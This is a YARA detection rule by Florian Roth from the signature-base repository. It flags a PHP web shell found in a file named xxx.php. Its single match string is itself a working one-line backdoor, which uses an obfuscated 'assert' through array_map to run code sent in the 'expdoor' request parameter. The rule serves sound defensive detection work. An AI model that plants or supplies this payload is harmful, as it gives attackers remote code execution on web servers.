rule SIGNATURE_BASE_Webshell_Webshells_New_Xxx
{
	meta:
		description = "Web shells - generated from file xxx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/yara/thor-webshells.yar#L3540-L3553"
		license_url = "https://github.com/Neo23x0/signature-base/blob/995df52f47284d130b8cbf57d08c31e927e44c09/LICENSE"
		hash = "0e71428fe68b39b70adb6aeedf260ca0"
		logic_hash = "837ed266af8a65ac683be39c32509df34bc8041b336a71c12700ca73bf210b4d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword

	condition:
		all of them
}
